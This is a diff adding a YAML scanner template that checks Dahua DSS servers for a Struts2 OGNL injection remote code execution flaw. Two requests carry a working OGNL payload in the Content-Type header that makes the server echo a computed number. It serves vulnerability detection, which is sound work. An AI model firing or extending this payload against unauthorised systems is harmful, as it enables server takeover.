@@ -1,0 +1,30 @@
+name: yaml-poc-dahuatech-dss-rce-CT-646518
+binding: fa1f9679-f94c-4b28-ad7c-9b3bc109f2b5
+detail:
+    author: haiqing.chen
+    vulnerability:
+        id: 59aa8241-6ccb-4566-952e-788c1604968f
+        level: critical
+    warning: Harmless
+transport: http
+set:
+    r1: randomInt(40000, 100000)
+    r2: randomInt(40000, 100000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /admin/login_login.action
+            headers:
+                Content-Type: '%{(#n=''multipart/form-data'').(#d=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#d):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println({{r1}}+{{r2}})).(#o.close())}'
+        expression: response.body_string.contains(string(r1 + r2))
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /portal/login_init.action
+            headers:
+                Content-Type: '%{(#n=''multipart/form-data'').(#d=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#d):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println({{r1}}*{{r2}})).(#o.close())}'
+        expression: response.body_string.contains(string(r1 * r2))
+expression: r0() || r1()
